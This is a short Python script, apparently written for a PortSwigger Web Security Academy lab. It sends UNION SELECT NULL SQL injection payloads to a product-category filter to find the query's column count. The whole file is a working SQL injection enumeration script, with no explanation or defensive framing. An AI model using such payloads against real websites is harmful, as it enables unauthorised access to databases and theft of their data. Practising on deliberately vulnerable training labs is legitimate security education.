import requests
base = 'https://0a21001604371a33806190ef0014006a.web-security-academy.net/filter?category='
# We'll iterate through a reasonable number of columns (1-8)\

for n in range(1, 9):
    injected = "' UNION SELECT {}-- ".format(','.join(['NULL'] * n))
    url = base + requests.utils.quote(injected)
    r = requests.get(url)

    print(injected, r.status_code, len(r.text))

    if 'Internal Server Error' not in r.text and 'SQL' not in r.text and r.status_code == 200:
        print(f"Likely correct column count: {n}\n")
        print(r.text[:500])
        break
    else:
        print(f"Column count {n} failed.")
